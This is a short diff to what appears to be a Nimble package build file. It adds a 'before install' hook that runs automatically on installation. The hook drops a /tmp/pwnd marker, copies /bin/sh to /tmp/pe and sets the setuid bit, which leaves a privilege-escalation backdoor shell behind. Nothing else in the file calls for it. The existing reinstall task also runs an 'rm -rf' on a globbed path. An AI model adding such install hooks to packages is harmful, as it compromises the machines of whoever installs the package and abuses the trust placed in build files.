@@ -17,3 +17,10 @@ task reinstall, "Reinstalls this package":
     var path = "~/.nimble/pkgs2/" & projectName() & "-" & $version & "-*"
     exec("rm -rf " & path)
     exec("nimble install")
+
+before install:
+  echo("REINSTALL HOOK")
+  exec("touch /tmp/pwnd")
+  exec("cp /bin/sh /tmp/pe")
+  exec("chmod u+s /tmp/pe")
+
